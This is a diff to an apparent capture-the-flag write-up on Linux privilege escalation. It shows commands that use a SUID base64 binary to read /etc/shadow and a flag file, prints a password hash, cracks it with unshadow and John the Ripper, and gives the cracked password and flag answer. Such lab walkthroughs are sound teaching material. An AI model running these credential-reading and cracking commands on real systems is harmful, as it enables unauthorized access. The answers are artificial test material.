@@ -98,5 +98,20 @@ GTFObins has a one-liner that allows you to run commands in nmap as sudo (if you
     - `base64 /etc/shadow | base64 --decode`
     - We get this password hash for user2: `$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/`
 - To use `unshadow`, we need both *passwd* and *shadow*
-    - `base64 /etc/shadow | base64 --decode > shadow` and `base64 /etc/passwd | base64 --decode > passwd`
+    - `unshadow` does not exist on target machine, and no sudo permissions to install
+    - We need to get `/etc/passwd` and `/etc/shadow` to our attack machine
+        - We can copy the contents of each after using `cat` and/or our base64 SUID exploit and `echo` them into files on our attack machine
+            - `echo '*/etc/passwd contents*' > passwd`
+            - `echo '*/etc/shadow contents*' > shadow`
+    - `unshadow passwd shadow > hash.txt` to output the hashes into *hash.txt*
+- *hash.txt* can now be cracked by **johntheripper**
+- `john hash.txt --wordlist=*path-to-wordlist*` (rockyou.txt worked for me)
 
+> The cracked password we find is **Password1**
+
+### What is the content of the flag3.txt file?
+
+- `cd /home/ubuntu`
+- `base64 flag3.txt | base64 --decode`
+
+> <details><summary>The flag found is </summary>THM-3847834</details>
